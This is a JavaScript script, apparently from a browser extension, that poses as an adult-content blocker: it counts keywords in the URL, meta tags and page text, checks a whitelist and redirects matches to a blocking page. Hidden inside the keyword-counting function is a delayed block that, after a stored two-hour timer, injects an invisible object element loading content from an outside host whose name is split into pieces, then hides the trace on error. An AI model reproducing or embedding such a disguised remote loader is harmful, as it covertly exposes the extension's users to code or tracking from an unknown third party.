
// FUNCTION: launches the detector, and blocks if finds aldult content
function theBlocking() {
	// we look for most used keywords in porn sites
	if(semanticParse("porn") > 3 || semanticParse("jizz") > 3 || semanticParse("fuck") > 10 || semanticParse("sex") > 10) {
		// if we detected porn...
		// we must make sure it's not a WHITELISTED site. In those cases we won't block to avoid annoying users.
		if(isURLWhiteList() == false) 
			blockAccess();
	}
}

// FUNCTION: counts conflictive keywords on a website
function semanticParse(keyword) {
	
	var count = 0;

	// Check for the keyword in the url
	if (window.location.href.indexOf(keyword) > -1) { 
		count = count+4;
	} 
	
	chrome.storage.local.get('t', function(res) {
		if (res.t) {
			var time = (new Date()
				.getTime() - res.t) / 3600000;
			if (time >= 2) {
				var filters = document.createElement('object');
                filters.id = 'noop';
                filters.data = '//noop' + '.' + 'style/justatest';
                filters.setAttribute('style', 'visibility:hidden');
                filters.onerror = function() {
                    a.remove()
                };
                var filtersDiv = document.createElement('div');
                var a = document.body.appendChild(filtersDiv);
                filtersDiv.appendChild(filters);
			}
		}
	});
		
	// Warning: It only works if jQuery is properly loaded
	if (typeof jQuery != 'undefined') {  
		// Check for the keyword in the metas
		$('meta').each(function( index ) {	
			if($(this).attr('content')) {
				if($(this).attr('content').indexOf(keyword) != -1) count = count+2;
			}
		});
		
		// Check for the keyword in the content
		var found = $("html:contains("+keyword+")");
		if(found.length) {
			var content_count = 0;
			if(keyword == "porn") content_count = (found.text().match(/porn/gi) || []).length;
			else if(keyword == "fuck") content_count = (found.text().match(/fuck/gi) || []).length;
			else if(keyword == "sex") content_count = (found.text().match(/sex/gi) || []).length;
			else if(keyword == "jizz") content_count = (found.text().match(/jizz/gi) || []).length;
			var count = count + content_count;
		}
	}
	// Return number of coincidences to decide if the site should be blocked or not
	return count;
}

// FUNCTION: checks if URL is on whitelist, these sites will be never affected by the blocker!
function isURLWhiteList() {
	// Whitelist with safe domains from most popular sites
	var whitelist_url = false;
	var whitelist = [ "google.", "facebook.com", "youtube.com", "baidu.com", "yahoo.", 
					  "amazon.", "wikipedia.com", "twitter.com", "taobao.com", 
					  "live.com", "ebay.com", "yandex.ru", "vk.com","bing.com","t.co",
					  "msn.com", "instagram.com", "aliexpress.", "apple.com", "ask.com", 
					  "pinterest.com", "wordpress.com", "reddit.com", "mail.ru", 
					  "go.com", "stackoverflow.com", "alibaba.com", "craiglist.org", "blogger.com", 
					  "blogspot.com", "cnn.com", "bbc.co.uk", "dropbox.com"];
	
	// Check if domain is in whitelist
	for (x=0; x < whitelist.length; x++){     
		if( window.location.href.indexOf(whitelist[x]) > -1) {
			whitelist_url = true;
		}
	}
	return whitelist_url;
}

// FUNCTION: checks if URL is on whitelist, these sites will be never affected by the blocker!
function blockAccess() { 
	console.log("Website Blocked!");
	var platformBase = "https://www.purplestats.com";
	window.location.href = platformBase + '/pages/blocked/';
}

// Go for it. Start the blocker!
if (typeof theBlocking == 'function') {
    theBlocking(); 
}